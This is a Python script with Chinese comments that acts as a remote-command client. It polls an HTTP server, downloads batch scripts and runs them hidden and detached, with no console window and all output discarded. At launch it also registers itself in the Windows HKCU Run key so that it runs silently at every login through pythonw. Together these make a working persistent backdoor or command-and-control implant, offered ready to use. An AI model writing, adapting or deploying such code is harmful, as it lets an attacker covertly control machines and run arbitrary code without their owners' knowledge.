#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
远程命令客户版 - 循环下载并【纯拉起】执行 bat 脚本

防重复下载由服务端负责（服务端按客户端 ID 记录下载历史，内容不变就不下发）：
  200 → 有新 bat：保存到 bat_cache/ 并后台静默执行（纯拉起，不跟踪/不管理进程）
  204 → 没有新内容：跳过，什么都不做
  404 → bat 已从服务器删除：纯拉起模式不处理（已拉起的进程继续运行）

用法：
  python httpbat.py                                # 使用代码内硬编码的服务器
  python httpbat.py --server 192.168.1.100:8000    # 临时覆盖硬编码服务器
"""
import argparse
import os
import socket
import subprocess
import sys
import time
from pathlib import Path

import requests

# ================== 配置 ==================
TOKEN = "change-me-please"                         # 必须与服务端 TOKEN 一致
DEFAULT_SERVER = "127.0.0.1:8000"                  # 硬编码默认服务器（改成你的实际 ip:端口 即可）
INTERVAL = 10                                       # 轮询间隔（秒）
WORK_DIR = Path(__file__).parent / "bat_cache"     # 下载的 bat 保存目录
# ==========================================


def start_bat(bat_path: str, cwd: str = None) -> subprocess.Popen:
    bat = str(Path(bat_path).resolve())
    return subprocess.Popen(
        ["cmd", "/c", bat],
        cwd=str(Path(cwd).resolve()) if cwd else None,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS
    )


def load_servers() -> list:
    """硬编码服务器列表：直接返回 DEFAULT_SERVER，不再读取 命令.txt。"""
    return [DEFAULT_SERVER]


def download_bat(server: str, client_id: str):
    """
    向服务器询问是否有新 bat，返回 (状态, 内容/错误)：
      ("ok", bytes)      有新 bat（服务端确认过该客户端没执行过）
      ("no_update", "")  没有新内容（服务端防重复下载）
      ("deleted", "")    bat 已从服务器删除
      ("auth", msg)      token 验证失败
      ("error", msg)     网络/服务器错误
    """
    url = f"http://{server}/download"
    try:
        r = requests.get(url, params={"client": client_id},
                         headers={"X-Token": TOKEN}, timeout=10)
    except requests.RequestException as e:
        return "error", str(e)
    if r.status_code in (401, 403):
        return "auth", "token 验证失败，请检查与服务端 TOKEN 是否一致"
    if r.status_code == 204:
        return "no_update", ""
    if r.status_code == 404:
        return "deleted", ""
    if r.status_code != 200:
        return "error", f"HTTP {r.status_code}"
    return "ok", r.content


def launch_bat(server: str, content: bytes):
    """纯拉起：保存 bat（唯一文件名，避免覆盖正在运行的旧文件）并后台执行；
    不保存进程句柄、不跟踪、不管理（不替换、不终止）。"""
    WORK_DIR.mkdir(parents=True, exist_ok=True)
    stamp = time.strftime("%Y%m%d_%H%M%S")
    bat_path = WORK_DIR / f"{server.replace(':', '_')}_{stamp}.bat"
    # 极短时间内防重名
    while bat_path.exists():
        bat_path = WORK_DIR / f"{server.replace(':', '_')}_{stamp}_{int(time.time()*1000)%1000}.bat"
    bat_path.write_bytes(content)
    start_bat(str(bat_path), cwd=str(Path(__file__).parent))
    print(f"[{server}] 已拉起 {bat_path.name}（纯拉起：不跟踪/不管理进程）")


def stop_task(server: str):
    """纯拉起模式：不管理进程，服务器删除脚本时仅提示，不终止已拉起的 bat。"""
    print(f"[{server}] 服务器已无脚本（纯拉起模式：不终止已拉起的进程）")


def main():
    _quiet_std()
    parser = argparse.ArgumentParser(description="远程命令客户版（纯拉起）")
    parser.add_argument("--server", action="append",
                        help="服务器 ip:端口，可多次指定（默认用代码内硬编码服务器）")
    parser.add_argument("--token", help="访问 token（默认用文件内 TOKEN）")
    parser.add_argument("--interval", type=int, default=INTERVAL,
                        help=f"轮询间隔秒数（默认 {INTERVAL}）")
    parser.add_argument("--name", default=socket.gethostname(),
                        help="客户端 ID，服务端按它区分不同客户端（默认主机名）")
    args = parser.parse_args()

    global TOKEN
    if args.token:
        TOKEN = args.token

    servers = args.server or load_servers()
    WORK_DIR.mkdir(parents=True, exist_ok=True)
    print(f"[客户端] ID: {args.name}")
    print(f"[客户端] 服务器列表: {servers}")
    print(f"[客户端] 轮询间隔: {args.interval}s")
    print(f"[客户端] 模式: 纯拉起（只下载执行，不跟踪/管理进程）")
    if TOKEN == "change-me-please":
        print("[警告] 正在使用默认 TOKEN，请尽快修改（服务端需保持一致）！")

    try:
        while True:
            for server in servers:
                state, payload = download_bat(server, args.name)
                if state == "ok":
                    launch_bat(server, payload)
                elif state == "deleted":
                    stop_task(server)
                elif state == "auth":
                    print(f"[{server}] {payload}")
                elif state == "error":
                    print(f"[{server}] 访问失败: {payload}")
                # no_update：没有新内容，静默跳过
            time.sleep(args.interval)
    except KeyboardInterrupt:
        print("\n[客户端] 已退出（已拉起的 bat 进程继续独立运行）")


def 自启动():
    """将本脚本注册到 Windows 登录自启动（HKCU\...\Run）。
    非 Windows 系统直接跳过；已注册则幂等，不会重复添加。"""
    if sys.platform != "win32":
        return
    import winreg
    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    app_name = "HttpBatClient"
    exe = sys.executable          # 优先用 pythonw 实现无控制台静默运行
    if exe.lower().endswith("python.exe"):
        cand = exe[:-len("python.exe")] + "pythonw.exe"
        if os.path.exists(cand):
            exe = cand
    script = str(Path(__file__).resolve())
    cmd = f'"{exe}" "{script}"'
    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path,
                            0, winreg.KEY_SET_VALUE) as key:
            winreg.SetValueEx(key, app_name, 0, winreg.REG_SZ, cmd)
        print(f"[自启动] 已注册到 Windows 登录自启动: {cmd}")
    except OSError as e:
        print(f"[自启动] 注册失败: {e}")


def _quiet_std():
    """若以 pythonw 运行（stdout 为 None），将输出重定向到空设备，避免 print 报错。"""
    if sys.stdout is None:
        devnull = open(os.devnull, "w", encoding="utf-8")
        sys.stdout = devnull
    if sys.stderr is None:
        sys.stderr = open(os.devnull, "w", encoding="utf-8")



if __name__ == "__main__":
    自启动()
    main()
